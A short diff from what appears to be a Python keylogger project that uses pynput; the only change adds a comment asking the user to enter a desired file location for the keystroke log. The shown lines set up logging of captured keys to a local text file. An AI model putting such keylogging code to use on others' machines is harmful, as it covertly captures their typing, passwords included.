@@ -1,7 +1,7 @@
 from pynput.keyboard import Key, Listener
 import logging
 
-log_directory = r"/Users/shubsharma/Desktop/Python/Keylogger./key.txt"
+log_directory = r"/Users/shubsharma/Desktop/Python/Keylogger./key.txt" #ENTER YOUR DESIRED FILE LOCATION.
 
 logging.basicConfig(filename = (log_directory), level = logging.DEBUG)
 
